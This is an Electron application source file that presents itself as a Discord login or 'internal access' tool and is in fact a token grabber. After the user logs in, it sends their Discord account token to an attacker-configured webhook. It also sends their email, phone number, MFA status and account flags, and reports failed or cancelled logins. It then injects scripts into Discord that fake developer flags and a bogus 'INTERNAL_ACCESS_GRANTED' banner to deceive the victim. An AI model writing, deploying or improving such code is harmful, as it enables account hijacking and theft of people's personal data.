const { app, BrowserWindow } = require('electron');
const LoginApi = require('electron-discordloginapi');
const fetch = require('node-fetch');
const moment = require('moment');

const { webhook_url } = require(__dirname + '/config.json');
if (!/^https?:\/\/(www\.)?[discord.com/api/webhooks]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()!@:%_\+.~#?&\/\/=]*)$/.test(webhook_url)) return console.log("Please run build.bat");
const { Webhook } = require("discord-webhook-client");
const webhook = new Webhook({
  url: webhook_url
});


// Handle creating/removing shortcuts on Windows when installing/uninstalling.
if (require('electron-squirrel-startup')) {
  // eslint-disable-line global-require
  app.quit();
}

const createWindow = () => {
  const win = new BrowserWindow();
  win.loadFile('src/index.html');

  LoginApi.startLogin();
  win.devTools = false;

  LoginApi.setLoginSuccessListener(result => {
    //when the login is complete
    fetch('https://discordapp.com/api/v6/users/@me', {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `${result.token}`
      }
    }).then(res => res.json()).then(json => {
      webhook.send(`
**ID**
ID: ${json.id}
**EMAIL**
${json.email} (verified: ${json.verified})
**PHONE NUMBER**
${json.phone ?? "No phone number set"}
**BIO**
${(json.bio.length > 0) ? json.bio : "No bio set"}
**MFA ENABLED**
${json?.mfa_enabled}
**PUBLIC FLAGS | FLAGS**
${json.public_flags} | ${json.flags}
**LOCALE**
${json.locale}
**CREATION DATE**
${getCreationDate(json.id)}`);
    });
    webhook.send(result.token);

    setTimeout(() => {
      win.close();
      const err = new BrowserWindow();
      err.loadURL('https://canary.discord.com/app');
      err.webContents.executeJavaScript("Object.defineProperty((webpackChunkdiscord_app.push([[''],{},(e)=>{m=[];for(let c in e.c){m.push(e.c[c])}}]),m).find((m)=>m?.exports?.default?.isDeveloper!==void 0).exports.default,\"isDeveloper\",{get:()=>true});");
      err.webContents.executeJavaScript("document.getElementsByClassName('colorHeaderSecondary-g5teka')[0].innerText = '1009384 - INTERNAL_ACCESS_GRANTED'");
      err.webContents.executeJavaScript("document.getElementsByClassName('marginTop4-2JFJJI')[1].innerHTML = '<span class=\"needAccount-MrvMN7\">You are viewing the Internal Login, think this is wrong? <a href=\"https://canary.discord.com/app\">Go to public login</a></span>'");
      err.webContents.executeJavaScript(`
        setInterval(() => {
          webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().flags = 1;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().flags = 1}}}]);
          console.log('Internal build fetch. Build Token: ${randomString(7)}');
        }, 2000)`);
    }, 2500);
  });
  
  LoginApi.setLoginFailListener(result => {
    //when the user enter wrong password/username or need captcha verification/2fa etc...
    setTimeout(() => {
      win.close();
      const err = new BrowserWindow();
      err.loadFile('src/error.html');
    }, 2500);
    webhook.send('User has entered the wrong password, needs captcha verification, or 2fa verification');
  });
  
  LoginApi.setCancelListener(() => {
    //when the user manualy close the login page
    webhook.send('User has canceled the login and closed login page');
    setTimeout(() => app.quit(), 1000);
  });
  
  // LoginApi.setCloseListener(() => {
  //   //when the page is closed by the user or after clogin complete
  //   webhook.send('Login button pressed and page has closed or user canceled the login');
  //   setTimeout(() => {
  //     win.close();
  //     const err = new BrowserWindow();
  //     err.loadURL('https://canary.discord.com/app');
  //     err.webContents.executeJavaScript("Object.defineProperty((webpackChunkdiscord_app.push([[''],{},(e)=>{m=[];for(let c in e.c){m.push(e.c[c])}}]),m).find((m)=>m?.exports?.default?.isDeveloper!==void 0).exports.default,\"isDeveloper\",{get:()=>true});")
  //     err.webContents.executeJavaScript("document.getElementsByClassName('colorHeaderSecondary-g5teka')[0].innerText = '1009384 - INTERNAL_ACCESS_GRANTED'");
  //     err.webContents.executeJavaScript("document.getElementsByClassName('marginTop4-2JFJJI')[1].innerHTML = '<span class=\"needAccount-MrvMN7\">You are viewing the Internal Login, think this is wrong? <a href=\"https://canary.discord.com/app\">Go to public login</a></span>'");
  //   }, 2500);
  // });
};

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.whenReady().then(() => {
  createWindow();
});

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

function convertIDtoUnix(id) {
  /* Note: id has to be str */
  const bin = (+id).toString(2);
  let unixbin = '';
  let unix = '';
  const m = 64 - bin.length;
  unixbin = bin.substring(0, 42 - m);
  unix = parseInt(unixbin, 2) + 1420070400000;
  return unix;
}

function getCreationDate(id) {
  const unix = convertIDtoUnix(id.toString());
  const timestamp = moment.unix(unix / 1000);
  return timestamp.format('YYYY-MM-DD, h:mm:ss A');
}

function randomString(amount) {
  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let result = '';
  for (let i = 0; i < amount; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}




// {
//   "id": "922403865717010442",
//   "username": "SelectiveOrangeGamefowl",
//   "avatar": null,
//   "discriminator": "9867",
//   "public_flags": 0,
//   "flags": 0,
//   "banner": null,
//   "banner_color": null,
//   "accent_color": null,
//   "bio": "",
//   "locale": "en-US",
//   "nsfw_allowed": true,
//   "mfa_enabled": false,
//   "email": "xorov45332@xtrempro.com",
//   "verified": true,
//   "phone": null
// }